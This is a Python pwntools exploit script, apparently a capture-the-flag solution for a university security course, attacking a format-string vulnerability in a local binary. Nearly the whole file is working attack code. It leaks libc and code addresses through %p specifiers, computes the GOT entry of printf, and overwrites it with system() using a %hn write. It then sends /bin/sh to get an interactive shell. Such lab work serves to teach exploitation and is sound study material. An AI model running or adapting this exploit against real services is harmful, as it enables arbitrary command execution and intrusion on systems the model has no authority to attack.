#!/usr/bin/env python3

import pwn

# this is required on gnome to start gdb
pwn.context.terminal = ['gnome-terminal', '--']

# pwninit
exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

pwn.gdb.attach(conn, gdbscript="""
set detach-on-fork off
set follow-fork-mode child
""")

pwn.pause()

# we can leak stack via %p%p%p
# we can write byte 0x4 at 42-th arg via: AAAA%42$hhn

# override well knwon .got of printf() with system()
# todo: leak code + libc first
for i in range(1,100,1):
    leak_i_format_string = b'%' + str(i).encode() +  b'$p'  
    conn.sendline(leak_i_format_string)
    data = conn.recvline()
    print(f'input {i}: {data}')

# input 55 has 
conn.sendline(b'%55$p')
libc_pointer = conn.recvline()
print(libc_pointer)
libc_p = int(libc_pointer[2:-1], 16)
print(f'libc pointer at: {hex(libc_p)}')
# info symbol 0x7a4b7b44b305
# __libc_start_main + 133
# why does this not work? -> libc.address = libc_p - (libc.symbols['__libc_start_main'] + 133)
#                            pointer         libc base
libc.address = libc_p - (0x75d174b22305 - 0x75d174b21000)
print(f'libc at: {hex(libc.address)}')
# double check with: vmmap

# input 56 has code pointer of exe
conn.sendline(b'%56$p')
code_pointer = conn.recvline()
print(code_pointer)
code_p = int(code_pointer[2:-1], 16)
print(f'code pointer at: {hex(code_p)}')

exe.address = code_p - exe.symbols['main'] 
print(f'code at: {hex(exe.address)}')

# code at: 0x632d29d04000
# .got of printf is at: 0x632d29d08018 (via: got in pwnpdb)
got_printf_addresss = exe.address + (0x632d29d08018 - 0x632d29d04000)
print(f'got of printf at: {hex(got_printf_addresss)}')


# system at:                      system address     libc_base
system_pointer = libc.address + (0x75c4de910490 - 0x75c4de8ea000)
print(f'system at: {hex(system_pointer)}')

# the buf is on the stack, so first leak address of buffer
# in input 4 is start address of buf:)
conn.sendline(b'%4$p')
buff_address = conn.recvline()
print(f'buf pointer at: {buff_address}')
buff_p = int(buff_address[2:-1], 16)
print(f'buf at: {hex(buff_p)}')


# now i want to override the lower 2 bytes at .got of printf with the system pointer (flip from printf to system)
# i can reach the first byte of the buffer via input 14, 15, 16,...
conn.sendline(b'BBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE%14$p%15$p%16$p%17$p')
print(conn.recvline())


# currently there is address of printf: 0x76ab6d0b65b0
#            we want address of system: 0x76ab6d0b0490
# last 2 bytes are different, so only write last 2 bytes

format_string = b''

target_value = pwn.p64(system_pointer)

# write to address (in input 16, so we have 16bytes for this in input 14+15)

# ! Important we first need to write format string, and write address bytes last, as the 2 zero bytes of 8 byte address end string

# use width of formatstring to write intoal as memory chars as we want to have later
format_string += b'A%' + str(pwn.u16(target_value[:2])-1).encode() + b'c'
# count chars written so far and save this at address stored in input 16
format_string += b'%16$hnAA'
# this is input 16 (part of the buffer, 8 Bytes algined), store the 6 bytes of address here (+ 2 null byte, string ends here)
format_string += pwn.p64(got_printf_addresss)

print(format_string)

# send format string and change .got
conn.sendline(format_string)

# get shell
conn.sendline(b'/bin/sh\x00')

# enjoy your shell
conn.interactive()